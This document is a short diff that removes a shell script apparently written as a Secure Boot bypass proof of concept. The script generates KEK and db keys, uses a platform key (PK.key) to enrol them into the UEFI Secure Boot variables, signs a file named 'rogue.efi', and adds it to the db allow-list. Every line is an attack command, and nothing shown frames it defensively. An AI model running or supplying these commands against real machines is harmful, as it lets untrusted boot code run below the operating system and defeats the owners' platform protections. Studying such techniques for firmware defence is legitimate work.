@@ -1,7 +1,0 @@
-openssl req -newkey rsa:4096 -nodes -keyout KEK.key -new -x509 -sha256 -days 3650 -subj "/CN=BRLY KEK/" -out KEK.crt
-openssl req -newkey rsa:4096 -nodes -keyout db.key -new -x509 -sha256 -days 3650 -subj "/CN=BRLY db/" -out db.crt
-sudo efi-updatevar -a -c KEK.crt -k PK.key KEK
-sudo efi-updatevar -a -c db.crt -k KEK.key db
-sbsign --key db.key --cert db.crt --output rogue.efi.signed rogue.efi
-sudo efi-updatevar -a -b rogue.efi -k KEK.key db
-
